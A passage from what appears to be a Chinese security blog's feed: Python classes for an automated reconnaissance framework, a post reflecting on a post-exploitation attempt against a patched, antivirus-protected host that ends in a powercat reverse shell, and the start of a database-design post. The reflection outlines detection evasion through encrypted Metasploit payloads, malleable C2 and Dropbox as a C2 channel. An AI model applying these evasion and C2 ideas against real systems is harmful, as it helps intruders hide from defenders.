        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update_database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_to_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abstractmethod&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abstractmethod&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abstractmethod&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update_database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pipe类用作模块与模块之间的通信，每个Module具有一个task_list和一个pipe_list。task_list作为Module的输入，当模块运行后将从task_list中获取任务然后执行，pipe_list中的Pipe对象是模块的数据出口，当模块执行完毕后，通过get_output()获取数据然后通过send_to_pipe()将数据送到各个pipe中去，而pipe将数据处理为下一个模块所需的特定格式后转送到下一个模块的task_list。&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;callable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TypeError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expected a function&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getargspec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;function should have only one parameter&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TypeError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expected a List or Module type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;register_module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TypeError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expected a Module&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后的问题是这些模块将如何被调度，最开始我的想法是为每个模块单开一个线程，每当有数据传送进来就立即处理。但是这样做感觉会增加服务器的负担，大多数模块都是以多线程是运行的，因此当模块同时运行时对cpu产生很大的负担。我定义了一个Controller类来调度各个模块，根据各个模块的task_list长度决定先运行哪个module，在一个模块停止运行之前第二个模块不会运行。&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Controller&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;heapq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heappush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;heapq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heapify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;heapq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heapify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PS:&lt;/p&gt;

&lt;p&gt;虽然很想讲点理论的东西，但是我从未接触过程序设计方面的内容，绞尽脑汁才想出了框架的轮廓。在设计框架的时候我的不足也立马显现了出来，我时常问自己，“我要做什么”，“我为什么要这样做”，但往往给不出完美的答案。不过秉着尽量可以重复利用代码的原则，我大体还是把它构思完了，不过以后如果有空还是应该多读一下设计模式方面的书籍。&lt;/p&gt;</content><author><name></name></author><category term="information-gathering" /><summary type="html">如果想要将各个信息收集工具整合到一起，就需要为他们封装出统一的接口，我把这些具有统一接口的对象定义为Module类。Module类具有三个抽象方法需要在封装模块的时候实现： exec 启动模块 get_output 获取模块执行结果 update_databse 将结果输出到数据库 class Module(metaclass=ABCMeta): def __init__(self, pipe=None): self.pipe_list = [] self.task_list = [] if isinstance(pipe, list): self.pipe_list = pipe[:] elif isinstance(pipe, Module): self.pipe_list.append(pipe) elif pipe is None: pass else: raise TypeError(&quot;Expected a List or Pipe type&quot;) def add_task(self, task): self.task_list.append(task) def register_pipe(self, pipe): if not isinstance(pipe, Pipe): raise TypeError(&quot;Expected a Pipe&quot;) else: self.pipe_list.append(pipe) def send_to_pipe(self, data=None): if data is None: for pipe in self.pipe_list: pipe.send(self.get_output()) else: for pipe in self.pipe_list: pipe.send(data) def run(self): self.exec() data = self.get_output() self.update_database(data) self.send_to_pipe(data) pass @abstractmethod def exec(self): pass @abstractmethod def get_output(self): pass @abstractmethod def update_database(self, data): pass Pipe类用作模块与模块之间的通信，每个Module具有一个task_list和一个pipe_list。task_list作为Module的输入，当模块运行后将从task_list中获取任务然后执行，pipe_list中的Pipe对象是模块的数据出口，当模块执行完毕后，通过get_output()获取数据然后通过send_to_pipe()将数据送到各个pipe中去，而pipe将数据处理为下一个模块所需的特定格式后转送到下一个模块的task_list。 class Pipe: def __init__(self, func=None, module=None): if func is not None: if not callable(func): raise TypeError(&quot;Expected a function&quot;) if len(getargspec(func).args) &amp;gt; 1: raise Exception(&quot;function should have only one parameter&quot;) self.process_data = func else: self.process_data = None self.module_list = [] if isinstance(module, list): self.module_list = module[:] elif isinstance(module, Module): self.module_list.append(module) elif module is None: pass else: raise TypeError(&quot;Expected a List or Module type&quot;) def send(self, data): if self.process_data is not None: data = self.process_data(data) for module in self.module_list: module.add_task(data) def register_module(self, module): if not isinstance(module, Module): raise TypeError(&quot;Expected a Module&quot;) else: self.module_list.append(module) 最后的问题是这些模块将如何被调度，最开始我的想法是为每个模块单开一个线程，每当有数据传送进来就立即处理。但是这样做感觉会增加服务器的负担，大多数模块都是以多线程是运行的，因此当模块同时运行时对cpu产生很大的负担。我定义了一个Controller类来调度各个模块，根据各个模块的task_list长度决定先运行哪个module，在一个模块停止运行之前第二个模块不会运行。 class Controller: def __init__(self): self.module_list = [] def push(self, module): heapq.heappush(self.module_list, module) def run(self): heapq.heapify(self.module_list) while len(self.module_list[0].task_list) != 0: self.module_list[0].run() heapq.heapify(self.module_list) PS: 虽然很想讲点理论的东西，但是我从未接触过程序设计方面的内容，绞尽脑汁才想出了框架的轮廓。在设计框架的时候我的不足也立马显现了出来，我时常问自己，“我要做什么”，“我为什么要这样做”，但往往给不出完美的答案。不过秉着尽量可以重复利用代码的原则，我大体还是把它构思完了，不过以后如果有空还是应该多读一下设计模式方面的书籍。</summary></entry><entry><title type="html">一次后渗透的反思</title><link href="https://citrusice.github.io/posts/post-exploition-rethink/" rel="alternate" type="text/html" title="一次后渗透的反思" /><published>2020-03-15T11:30:22+08:00</published><updated>2020-03-15T11:30:22+08:00</updated><id>https://citrusice.github.io/posts/post-exploition-rethink</id><content type="html" xml:base="https://citrusice.github.io/posts/post-exploition-rethink/">&lt;p&gt;项目的一个目标，在可以执行命令后开始进行后渗透的工作。目标低权限，同时服务器装了杀软，还打了很多补丁，加上网络实在是不行所以工作展开的异常艰难，最终也只是获得一个反弹shell，所以写篇文章反思一下当前使用的工具还有哪些不足。&lt;/p&gt;

&lt;h1 id=&quot;过程&quot;&gt;过程&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;首先是自写的内存加载器，传上去没有问题，但是在加载msf的reverse_tcp payload之后（刚开启session但未接收到stager）程序自动退了，再运行程序的时候发现程序已经打不开了，失败。&lt;/li&gt;
  &lt;li&gt;怀疑是限制了流量，遂改成使用powershell加载cs的reverse_http，服务放在了80端口，同样失败。&lt;/li&gt;
  &lt;li&gt;尝试ssh隧道，连不上服务器&lt;/li&gt;
  &lt;li&gt;尝试马+dns隧道，dns隧道可以连通，但是上马失败&lt;/li&gt;
  &lt;li&gt;进行上述操作的过程会中间歇性地ban我ip，最后只好借了朋友的服务器，用powercat反弹了个shell，耻辱结束。&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;分析&quot;&gt;分析&lt;/h1&gt;

&lt;p&gt;虽然只进行了几次尝试，但几乎花费了我一天的时间，大部分时间都花在了配置以及忍受极慢网速的过程中。仔细分析各种方法失败的原因，我觉得问题出在流量上面。内存加载器获取payload的时候payload没有经过加密，之后的通信过程也没有加密，因此被识别出流量特征，之后的cs的reverse_http也同样如此。dns隧道尽管与服务器建立了加密隧道，但是在马与隧道之间流量扔需要经过本地回环，因此再次失败了。ssh隧道没法连接成功可能因为做了acl之类的东西。&lt;/p&gt;

&lt;p&gt;因此可以改进的地方有两点&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;流量特征&lt;/li&gt;
  &lt;li&gt;可信的ip/域名&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;解决&quot;&gt;解决&lt;/h1&gt;

&lt;p&gt;流量特征的问题很好解决，msf可以使用rc4加密的payload，cs也有malleable C2可以修改证书加密流量。那如何让自己的ip/域名可信呢？奇安信A-team在2019BCS中介绍过很多使用第三方服务用作C2的文章，这对我来说是相对可行的方案。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://truneski.github.io/blog/2018/11/05/cobaltstrike-over-external-c2-via-dropbox/&quot;&gt;Dropbox as a C2 channel using the Dropbox APIs&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;感觉又要写好多代码。。&lt;/p&gt;</content><author><name></name></author><category term="post-exploition" /><summary type="html">项目的一个目标，在可以执行命令后开始进行后渗透的工作。目标低权限，同时服务器装了杀软，还打了很多补丁，加上网络实在是不行所以工作展开的异常艰难，最终也只是获得一个反弹shell，所以写篇文章反思一下当前使用的工具还有哪些不足。 过程 首先是自写的内存加载器，传上去没有问题，但是在加载msf的reverse_tcp payload之后（刚开启session但未接收到stager）程序自动退了，再运行程序的时候发现程序已经打不开了，失败。 怀疑是限制了流量，遂改成使用powershell加载cs的reverse_http，服务放在了80端口，同样失败。 尝试ssh隧道，连不上服务器 尝试马+dns隧道，dns隧道可以连通，但是上马失败 进行上述操作的过程会中间歇性地ban我ip，最后只好借了朋友的服务器，用powercat反弹了个shell，耻辱结束。 分析 虽然只进行了几次尝试，但几乎花费了我一天的时间，大部分时间都花在了配置以及忍受极慢网速的过程中。仔细分析各种方法失败的原因，我觉得问题出在流量上面。内存加载器获取payload的时候payload没有经过加密，之后的通信过程也没有加密，因此被识别出流量特征，之后的cs的reverse_http也同样如此。dns隧道尽管与服务器建立了加密隧道，但是在马与隧道之间流量扔需要经过本地回环，因此再次失败了。ssh隧道没法连接成功可能因为做了acl之类的东西。 因此可以改进的地方有两点 流量特征 可信的ip/域名 解决 流量特征的问题很好解决，msf可以使用rc4加密的payload，cs也有malleable C2可以修改证书加密流量。那如何让自己的ip/域名可信呢？奇安信A-team在2019BCS中介绍过很多使用第三方服务用作C2的文章，这对我来说是相对可行的方案。 Dropbox as a C2 channel using the Dropbox APIs 感觉又要写好多代码。。</summary></entry><entry><title type="html">自动化信息收集框架：设计数据库</title><link href="https://citrusice.github.io/posts/database-design/" rel="alternate" type="text/html" title="自动化信息收集框架：设计数据库" /><published>2020-03-06T11:20:33+08:00</published><updated>2020-03-06T11:20:33+08:00</updated><id>https://citrusice.github.io/posts/database-design</id><content type="html" xml:base="https://citrusice.github.io/posts/database-design/">&lt;p&gt;对于渗透来说，信息收集的完整度决定了最后渗透的成功与否。当对一个大型目标进行渗透的过程中，信息收集的工作便变得繁重。尽管现在有诸多自动化工具为我们完成信息收集方方面面的工作，但是如何将这些工具串联起来？输入一个域名后就能自动进行各方面的收集（包括子域名，端口探测，web指纹，web路径等等），这是我所期望的效果。因此我想要实现一个框架，将各种工具组合到一起进行全自动的信息收集。&lt;/p&gt;

&lt;h1 id=&quot;数据存储与数据库范式&quot;&gt;数据存储与数据库范式&lt;/h1&gt;

&lt;p&gt;在信息收集之后，我们应该如何存储这些收集来的数据？长久以来我都是对每一个项目单开一个文件夹，将扫描结果以文本的形式零散的存放进去。这样做既不便于整理也不便于查找。因此我产生了使用数据库的念头（事实上数据库不就是干这个用的嘛）。随之而来的问题是如何设计？我们知道数据库由库、表组成，表中是按照列名存储的一行一行数据，怎样的设计才能让我们的数据是简洁、结构清晰同时还方便查找，这时候就需要用到数据库范式。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;数据库的设计范式是数据库设计所需要满足的规范，满足这些规范的数据库是简洁的、结构明晰的，同时，不会发生插入（insert）、删除（delete）和更新（update）操作异常。反之则是乱七八糟，不仅给数据库的编程人员制造麻烦，而且面目可憎，可能存储了大量不需要的冗余信息。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;下面只对4个范式进行简单回顾。&lt;/p&gt;

&lt;h2 id=&quot;1nf&quot;&gt;1NF&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;1NF是对属性的&lt;strong&gt;原子性&lt;/strong&gt;，要求属性具有原子性，不可再分解；&lt;/p&gt;
&lt;/blockquote&gt;

